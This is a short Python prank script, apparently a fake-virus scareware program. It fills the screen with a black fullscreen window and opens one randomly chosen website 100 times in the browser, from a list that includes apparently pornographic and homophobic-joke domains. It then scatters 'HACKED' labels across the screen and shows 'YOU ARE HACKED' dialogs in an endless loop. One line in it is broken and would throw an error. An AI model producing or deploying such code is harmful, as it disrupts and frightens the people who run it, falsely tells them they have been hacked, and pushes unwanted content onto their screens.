import time
import tkinter as tk
import random
import pyautogui
import webbrowser 
from tkinter import * 
from tkinter import Tk, messagebox  
root  = tk.Tk()
root.attributes("-fullscreen" , 1)
root.config(bg='black')
website  = ["www.xxxvidios.com","www.GOOGLE.COM" ,'WWW.YOUTUBE.COM' , 'WWW.XVIDIOS.COM' , 'WWW.WHYIAMGAY']
tabs = random.choice(website)
time.sleep(1)
for i in range(100):
    webbrowser.open(tabs,new=200)
def place_msg():
    x = random.randint(10,pyautogui.size().width)
    y = random.randint(10,pyautogui.size().height)
    msg = tk.Label(root, text='HACKED', bg='black' , fg='red', font=('Arial' , 15))
    msg.place(x=x, y=y)
    root.after(1000, place_msg)
    
root.after(1000, place_msg)
window = Tk()
window.eval(" " % window.winfo_toplevel())
window.withdraw()
a = 0
while a<2:
    print(messagebox.askyesno('Qutions',"YOU ARE HACKED",icon='error'))
root  = tk.Tk()
root.mainloop()